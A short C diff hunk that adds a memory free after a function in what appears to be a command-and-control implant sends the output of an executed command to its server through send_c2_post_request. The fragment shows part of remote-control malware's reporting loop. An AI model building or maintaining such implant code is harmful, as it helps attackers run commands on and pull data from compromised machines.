@@ -154,7 +154,7 @@ void dispatcher(cJSON *task){
 
         char* command_executed = cJSON_Print(root);
         send_c2_post_request(command_executed);
-
+        free(command_executed);
         free(command_output);
     }
     else{
